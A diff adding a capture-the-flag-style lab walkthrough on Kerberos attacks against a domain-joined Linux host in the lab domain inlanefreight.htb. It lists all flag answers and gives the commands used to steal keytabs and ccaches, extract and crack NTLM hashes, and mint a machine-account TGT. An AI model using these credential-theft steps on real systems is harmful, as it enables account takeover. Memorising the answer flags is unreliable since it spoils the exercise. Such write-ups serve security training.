@@ -386,7 +386,200 @@ Output saved to a folder named `linikatz.*` with all artifacts separated by form
 
 ## Exercise
 
-*Add exercise answers here as you complete them*
+**Target:** `10.129.88.10` (LINUX01) — SSH on port `2222`
+**Domain:** `inlanefreight.htb` (sssd-joined Ubuntu host) — DC at `dc01.inlanefreight.htb` / `172.16.1.10`
+**Initial creds:** `david@inlanefreight.htb : Password2`
+
+### Answers
+
+| # | Question | Answer |
+|---|----------|--------|
+| 1 | Flag in david's home dir | `Gett1ng_Acc3$$_to_LINUX01` |
+| 2 | Group permitted to login to LINUX01 | `Linux Admins` |
+| 3 | Writable keytab file | `carlos.keytab` (`/opt/specialfiles/`) |
+| 4 | Flag in carlos's home (cracked from keytab) | `C@rl0s_1$_H3r3` |
+| 5 | Flag in svc_workstations home (via cron-dropped keytab) | `Mor3_4cce$$_m0r3_Pr1v$` |
+| 6 | Flag in `/root/flag.txt` (sudo) | `Ro0t_Pwn_K3yT4b` |
+| 7 | Flag from `\\DC01\julio` (ccache in `/tmp`) | `JuL1()_SH@re_fl@g` |
+| 8 | Flag from `\\DC01\linux01` (LINUX01$ machine TGT) | `Us1nG_KeyTab_Like_@_PRO` |
+
+---
+
+### Q1 — david SSH access
+
+```bash
+ssh -p 2222 david@inlanefreight.htb@10.129.88.10   # Password2
+cat ~/flag.txt                                     # → Gett1ng_Acc3$$_to_LINUX01
+```
+
+> 💡 SSH login format `<user>@<realm>@<host>` because sssd uses `login-formats: %U@inlanefreight.htb`.
+
+---
+
+### Q2 — Permitted group
+
+```bash
+realm list
+# permitted-groups: Linux Admins
+```
+
+---
+
+### Q3 — Writable keytab
+
+```bash
+find / -name "*.keytab" 2>/dev/null | while read f; do
+  [ -r "$f" ] && [ -w "$f" ] && echo "RW: $f"
+done
+# RW: /opt/specialfiles/carlos.keytab
+```
+
+> ⚠️ World-writable keytab (`-rw-rw-rw-`) is a glaring misconfig — anyone on the box owns the principal it stores.
+
+---
+
+### Q4 — PtT to carlos via keytab → NTLM crack
+
+**Step 1 — Copy keytab to attacker, extract hashes:**
+
+```bash
+scp -P 2222 david@inlanefreight.htb@10.129.88.10:/opt/specialfiles/carlos.keytab /tmp/
+wget https://raw.githubusercontent.com/sosdave/KeyTabExtract/master/keytabextract.py
+python3 keytabextract.py /tmp/carlos.keytab
+# NTLM HASH: a738f92b3c08b424ec2d99589a9cce60
+```
+
+**Step 2 — Crack NTLM with hashcat:**
+
+```bash
+echo 'a738f92b3c08b424ec2d99589a9cce60' > /tmp/carlos.ntlm
+hashcat -m 1000 /tmp/carlos.ntlm /usr/share/wordlists/rockyou.txt
+# → Password5
+```
+
+**Step 3 — SSH as carlos:**
+
+```bash
+ssh -p 2222 carlos@inlanefreight.htb@10.129.88.10   # Password5
+cat ~/flag.txt   # → C@rl0s_1$_H3r3
+id   # ...,linux admins → privileged group
+```
+
+---
+
+### Q5 — Pivot to svc_workstations via carlos's cron
+
+Inspect carlos's environment:
+
+```bash
+cat /etc/crontab
+# */5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
+
+ls -la ~/.scripts/
+# john.keytab
+# kerberos_script_test.sh
+# svc_workstations.kt          (AES-only)
+# svc_workstations._all.kt     (RC4 + AES128 + AES256)  ← has NTLM!
+
+cat ~/.scripts/kerberos_script_test.sh
+# kinit svc_workstations -k -t .../svc_workstations.kt
+# smbclient //dc01/svc_workstations -k ... > script-test-results.txt
+```
+
+Pull the **`._all.kt`** version (contains RC4 → NTLM):
+
+```bash
+scp -P 2222 carlos@inlanefreight.htb@10.129.88.10:'/home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt' /tmp/
+python3 keytabextract.py /tmp/svc_workstations._all.kt
+# NTLM: 7247e8d4387e76996ff3f18a34316fdd
+
+hashcat -m 1000 <hash> rockyou.txt
+# → Password4
+
+ssh -p 2222 svc_workstations@inlanefreight.htb@10.129.88.10
+cat ~/flag.txt   # → Mor3_4cce$$_m0r3_Pr1v$
+```
+
+> 💡 **AES-only keytab ≠ crackable.** Always check for the RC4 variant — it gives you the NTLM hash directly. If only AES is available, you can crack with `hashcat -m 19900` (Kerberos 5 AES256) but it requires the salt and is slower.
+
+---
+
+### Q6 — Root via sudo
+
+```bash
+sudo -l
+# (ALL) ALL  ← unrestricted
+
+sudo cat /root/flag.txt
+# → Ro0t_Pwn_K3yT4b
+```
+
+---
+
+### Q7 — Steal julio's ccache from `/tmp`
+
+When users authenticate via sssd/PAM, their TGT is stored as a `FILE:` ccache in `/tmp/krb5cc_<UID>_<random>`. As root we can read anyone's:
+
+```bash
+sudo ls -la /tmp/krb5cc_*
+# -rw------- julio  /tmp/krb5cc_647401106_5f8kHr   ← TGT
+# -rw------- julio  /tmp/krb5cc_647401106_HRJDux
+
+sudo cp /tmp/krb5cc_647401106_5f8kHr /tmp/julio.ccache
+sudo chmod 644 /tmp/julio.ccache
+
+export KRB5CCNAME=/tmp/julio.ccache
+klist
+# Default principal: julio@INLANEFREIGHT.HTB
+# krbtgt/INLANEFREIGHT.HTB
+
+smbclient //dc01/julio -k -c "get julio.txt /tmp/julio.txt"
+cat /tmp/julio.txt   # → JuL1()_SH@re_fl@g
+```
+
+> ⚠️ **FQDN gotcha:** `smbclient //dc01.inlanefreight.htb/julio -k` hangs silently on this Samba 4.13 / sssd combo. Use the **short hostname** `//dc01/julio` — Kerberos will canonicalize via realm config.
+
+---
+
+### Q8 — LINUX01$ machine account TGT
+
+Every domain-joined Linux host has a machine keytab at `/etc/krb5.keytab` readable only by root. Use it to mint a TGT for the computer account:
+
+```bash
+sudo klist -k /etc/krb5.keytab
+#   2  LINUX01$@INLANEFREIGHT.HTB
+#   2  host/LINUX01@INLANEFREIGHT.HTB
+#   2  host/linux01.inlanefreight.htb@INLANEFREIGHT.HTB
+
+sudo bash -c 'KRB5CCNAME=/tmp/linux01.ccache kinit -k LINUX01\$ && chmod 644 /tmp/linux01.ccache'
+
+export KRB5CCNAME=/tmp/linux01.ccache
+klist
+# Default principal: LINUX01$@INLANEFREIGHT.HTB
+
+smbclient //dc01/linux01 -k -c "get flag.txt /tmp/linux01_flag.txt"
+cat /tmp/linux01_flag.txt
+# → Us1nG_KeyTab_Like_@_PRO   (file has UTF-16 BOM, strip if needed)
+```
+
+> 💡 `kinit -k LINUX01$` (escape `$` as `\$` in bash) reads the host's machine secret from `/etc/krb5.keytab` and requests a TGT for the computer account. Many AD shares grant access to `Domain Computers` — abuse that.
+
+---
+
+### Lessons Learned
+
+1. **sssd login format** is `<user>@<realm>@<host>` for SSH — easy to forget vs. local `<user>@<host>`.
+2. **`realm list`** dumps `permitted-groups` / `permitted-logins` — fastest path to enumerate AD access controls on a Linux host.
+3. **World-writable `.keytab` files** are a single-find gold mine. Always check r+w on every keytab.
+4. **`keytabextract.py`** pulls NTLM (from RC4-HMAC entry), AES128, AES256 hashes from any `.keytab`.
+5. **AES-only keytab vs `_all.kt`** — if RC4 entry is missing you only get AES, which crack-times >> NTLM. Look for sibling `*._all.kt` or older keytab versions.
+6. **Cron jobs run as user X** often drop fresh keytabs / ccaches readable by X. Watch `~/.scripts/`, `~/.cache/`, `/var/spool/`.
+7. **`/tmp/krb5cc_<UID>_<rand>`** ccaches persist for the lifetime of the user's session — `sudo cp` + `KRB5CCNAME=<file>` impersonates them without ever knowing the password.
+8. **Short hostname > FQDN** for `smbclient -k` when Samba/sssd misbehave on canonicalization. Test both.
+9. **`/etc/krb5.keytab`** stores the host's machine account secret — `sudo kinit -k LINUX01$` mints a TGT for `LINUX01$@DOMAIN`. Machine accounts often have lateral SMB read access on AD shares.
+10. **Escape `$` in bash** when invoking `kinit -k MACHINE$` — use `MACHINE\$` or single quotes.
+11. **`(ALL) ALL` sudo on a service account** = full chain compromise. Check `sudo -l` after every pivot.
+12. **PAM-cached ccaches outlive the SSH session** — left-behind tickets in `/tmp` are a recurring gift.
 
 ---
 
